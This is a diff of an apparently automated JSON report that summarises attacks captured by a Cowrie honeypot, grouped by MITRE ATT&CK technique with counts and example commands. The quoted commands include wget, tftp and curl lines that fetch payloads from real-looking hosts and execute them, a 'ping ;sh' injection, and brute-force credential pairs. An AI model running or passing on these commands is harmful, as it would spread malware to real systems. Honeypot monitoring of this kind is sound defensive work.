@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-09-18 09:03:44",
+  "generated": "2026-09-18 10:05:08",
   "totals": {
-    "commands": 232,
-    "login_failed": 634,
-    "login_success": 59,
-    "sessions": 777
+    "commands": 265,
+    "login_failed": 696,
+    "login_success": 65,
+    "sessions": 841
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 634,
+      "count": 696,
       "examples": [
         "admin / user",
         "root / 123456",
@@ -21,14 +21,14 @@
         "admin / fuckfest"
       ],
       "first": "2026-09-18T00:03:59.596268Z",
-      "last": "2026-09-18T09:03:22.992508Z",
-      "unique_ips": 53
+      "last": "2026-09-18T10:04:42.555452Z",
+      "unique_ips": 61
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 59,
+      "count": 65,
       "examples": [
         "ubuntu / ubuntu",
         "adm / adm",
@@ -37,30 +37,14 @@
         "root / admin"
       ],
       "first": "2026-09-18T00:24:48.056231Z",
-      "last": "2026-09-18T08:56:51.358294Z",
-      "unique_ips": 28
-    },
-    {
-      "id": "T1105",
-      "name": "Ingress Tool Transfer",
-      "tactic": "Command and Control",
-      "count": 22,
-      "examples": [
-        "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
-        "(tftp -g 185.93.89.72 -r tftp -l- || busybox tftp -g 185.93.89.72 -r tftp -l-) > t; chmod 777 t; ./t; rm -rf t",
-        "(ftpget 185.93.89.72 f ftpget || busybox ftpget 185.93.89.72 f ftpget) > f; chmod 777 f; ./f; rm -rf f",
-        "curl -sL -o /tmp/install.sh https://del.sou.pp.ua/install.sh && bash /tmp/install.sh; rm -f /tmp/install.sh",
-        "https://del.sou.pp.ua/install.sh"
-      ],
-      "first": "2026-09-18T01:58:59.591466Z",
-      "last": "2026-09-18T08:56:52.149349Z",
-      "unique_ips": 4
+      "last": "2026-09-18T10:01:03.464713Z",
+      "unique_ips": 34
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 20,
+      "count": 36,
       "examples": [
         ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/",
         ">/var/d && chmod 777 /var/d && /var/d && cd /var/",
@@ -69,14 +53,30 @@
         ">/dev/d && chmod 777 /dev/d && /dev/d && cd /dev/"
       ],
       "first": "2026-09-18T01:58:57.968693Z",
-      "last": "2026-09-18T08:56:52.149349Z",
+      "last": "2026-09-18T09:47:55.829917Z",
+      "unique_ips": 7
+    },
+    {
+      "id": "T1105",
+      "name": "Ingress Tool Transfer",
+      "tactic": "Command and Control",
+      "count": 25,
+      "examples": [
+        "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
+        "(tftp -g 185.93.89.72 -r tftp -l- || busybox tftp -g 185.93.89.72 -r tftp -l-) > t; chmod 777 t; ./t; rm -rf t",
+        "(ftpget 185.93.89.72 f ftpget || busybox ftpget 185.93.89.72 f ftpget) > f; chmod 777 f; ./f; rm -rf f",
+        "curl -sL -o /tmp/install.sh https://del.sou.pp.ua/install.sh && bash /tmp/install.sh; rm -f /tmp/install.sh",
+        "https://del.sou.pp.ua/install.sh"
+      ],
+      "first": "2026-09-18T01:58:59.591466Z",
+      "last": "2026-09-18T09:47:55.829917Z",
       "unique_ips": 5
     },
     {
       "id": "T1082",
       "name": "System Information Discovery",
       "tactic": "Discovery",
-      "count": 15,
+      "count": 18,
       "examples": [
         "uname -a",
         "cat /proc/cpuinfo",
@@ -85,8 +85,8 @@
         "uname -s -m"
       ],
       "first": "2026-09-18T00:25:00.479830Z",
-      "last": "2026-09-18T08:46:32.885575Z",
-      "unique_ips": 11
+      "last": "2026-09-18T09:15:34.070916Z",
+      "unique_ips": 13
     },
     {
       "id": "T1057",
@@ -133,27 +133,39 @@
       "id": "T1033",
       "name": "System Owner/User Discovery",
       "tactic": "Discovery",
-      "count": 4,
+      "count": 6,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
         "id"
       ],
       "first": "2026-09-18T01:58:59.591466Z",
-      "last": "2026-09-18T08:56:51.650171Z",
-      "unique_ips": 4
+      "last": "2026-09-18T09:47:11.222886Z",
+      "unique_ips": 6
     },
     {
       "id": "T1059.004",
       "name": "Command and Scripting Interpreter: Unix Shell",
       "tactic": "Execution",
-      "count": 3,
+      "count": 4,
       "examples": [
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
         "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# ================================="
       ],
       "first": "2026-09-18T03:19:54.207938Z",
-      "last": "2026-09-18T05:49:14.882666Z",
+      "last": "2026-09-18T09:08:33.005117Z",
+      "unique_ips": 4
+    },
+    {
+      "id": "T1070.004",
+      "name": "Indicator Removal: File Deletion",
+      "tactic": "Defense Evasion",
+      "count": 3,
+      "examples": [
+        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || "
+      ],
+      "first": "2026-09-18T03:19:54.207938Z",
+      "last": "2026-09-18T09:08:33.005117Z",
       "unique_ips": 3
     },
     {
@@ -166,18 +178,6 @@
       ],
       "first": "2026-09-18T02:28:03.535500Z",
       "last": "2026-09-18T07:07:56.434741Z",
-      "unique_ips": 2
-    },
-    {
-      "id": "T1070.004",
-      "name": "Indicator Removal: File Deletion",
-      "tactic": "Defense Evasion",
-      "count": 2,
-      "examples": [
-        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || "
-      ],
-      "first": "2026-09-18T03:19:54.207938Z",
-      "last": "2026-09-18T04:18:53.181296Z",
       "unique_ips": 2
     },
     {
@@ -232,15 +232,15 @@
     ],
     [
       "system",
-      15
+      16
     ],
     [
       "shell",
-      15
+      16
     ],
     [
       "sh",
-      15
+      16
     ],
     [
       "/bin/busybox",
@@ -251,15 +251,27 @@
       10
     ],
     [
+      "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
+      8
+    ],
+    [
       "enable",
-      3
+      4
     ],
     [
       "linuxshell",
-      2
+      3
     ],
     [
       "cd /proc && cat self/cmdline",
+      3
+    ],
+    [
+      "enablelinuxshell",
+      2
+    ],
+    [
+      "ping ;sh",
       2
     ],
     [
@@ -279,23 +291,11 @@
       2
     ],
     [
-      "enablelinuxshell",
-      1
-    ],
-    [
-      "ping ;sh",
-      1
-    ],
-    [
       "busybox",
       1
     ],
     [
       "Accept-Encoding: gzip",
-      1
-    ],
-    [
-      "echo SHELL_TEST",
       1
     ]
   ]
